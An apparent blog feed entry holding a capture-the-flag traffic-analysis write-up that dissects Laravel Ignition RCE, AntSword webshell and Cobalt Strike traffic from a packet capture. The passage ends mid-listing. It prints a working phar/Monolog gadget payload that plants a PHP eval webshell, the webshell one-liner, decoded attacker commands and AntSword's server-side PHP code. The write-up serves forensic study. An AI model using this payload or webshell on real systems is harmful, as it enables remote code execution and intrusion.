      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¿™æ¬¡æ‰“ç»¿åŸæ¯ä»£ä»·æŒºå¤§çš„ï¼Œæ”¹ç­¾æœºç¥¨æå‰ä½äº†ä¸€æ™šå®¾é¦†ï¼Œåœ¨é«˜é“ç«™æ‰“äº†ä¸€å¤©åˆèµ›ï¼›è¿›äº†çº¿ä¸‹å­¦æ ¡ä¸æŠ¥é”€è·¯è´¹ï¼Œæ¥å›å¹³å‡ä¸€ä¸ªäºº1500å—ï¼Œä¸€å…±å»äº†å››ä¸ªäººã€‚æœ€</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Traffic analysis in Lvcheng Cup</title>
    <link href="https://polosec.github.io/2021/10/09/Traffic-analysis-in-Lvcheng-Cup/"/>
    <id>https://polosec.github.io/2021/10/09/Traffic-analysis-in-Lvcheng-Cup/</id>
    <published>2021-10-09T02:59:51.000Z</published>
    <updated>2021-10-09T07:43:36.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Target: <strong>FIND THE FLAG(hint : AntSwort traffic)</strong></p><p>Personally I think this problem is challenging for me,it contains Cobalt Strike traffic analysis, laravel Rce traffic analysis and AntSwort traffic analysis.</p><h1 id="AntSword-and-Laravel-RCE-Traffic-Analysis"><a href="#AntSword-and-Laravel-RCE-Traffic-Analysis" class="headerlink" title="AntSword  and Laravel RCE Traffic  Analysis"></a>AntSword  and Laravel RCE Traffic  Analysis</h1><p>There are many packets in the pcap file,personally Iâ€™â€™ll use http.request.method==POST to filter http traffic beacuse most of webshell are use post method sends data to victims.Obviously there are too many packets contains ignition field, after googling, I found that this is Laravel RCE explotiation. </p><p><img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image"><br>Following figure shows that .config.php were frequently requested ,follow it in HTTP stream, obviously the webshell executed ls command.</p><p><img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image"><br><img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image"></p><h2 id="node1"><a href="#node1" class="headerlink" title="node1"></a>node1</h2><p>Keep following requests which connnected to config.php,we can find a pacaket made an extract operation and the file name is secret.zip,this file is suspicious and it should be recovered .After extarcing HTTP objects I havenâ€™t find secret.zip,so keep following  packets.<br><img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image"><br><img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image"></p><h2 id="node1-end"><a href="#node1-end" class="headerlink" title="node1 end"></a>node1 end</h2><p>In a packet we find PK filed in response data,so it should be recovered with zip file format.There is one thing to note,in the start and end postions of response data exists hex data,AntSword added it to reduce traffic character.</p><p><img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image"></p><p>Use 010 editor to recover this file ,then open it, but it tips me password are required,now I didnâ€™t find any passwords,after fix ,check and broute tools I still canâ€™t open it.So I have to find the password.We can find that the secret file is .cobaltstrike.beacon_keys file ,itâ€™s serialized file contains public and private key.If we can crack the password and recover private key, the ciphertext between hacker and coblatstrike teamserver will be cracked.</p><p>In <strong>node 1</strong> we find an extract command were executed, so next setp is recover webshell contents and know the exact command, it must contains exact password.The webshell were written by Laravel RCE, so we should find what hacker did via Laravel RCE exploitation.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>Replacing =00 to null then base64 decode it, we can get the webshell contents.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">ï¿½a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~Ø¶test.txt\KKa~Ø¶testtest6z&#x3D;Jcï¿½Fï¿½ï¿½ØİŒ&amp;~ï¿½&lt;@ï¿½ï¿½GBMB</span><br></pre></td></tr></table></figure><?php @eval(@gzinflate(base64_decode($_POST[14433])));?><p> are webshell.We can decode traffic after base64 and gzip decode.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure><p>Above encryped data are webshell commands which executing extract zip file,decode it with base64 and gzip, we can get the source code of server send to client.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">foreach($oparr as $item) &#123;</span><br><span class="line">if(!@is_writable($item)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">@mkdir($tmdir);</span><br><span class="line">if(!@file_exists($tmdir)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">@chdir($tmdir);</span><br><span class="line">@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">@chdir(&quot;..&quot;);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">@rmdir($tmdir);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($envstr)) &#123;</span><br><span class="line">$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span 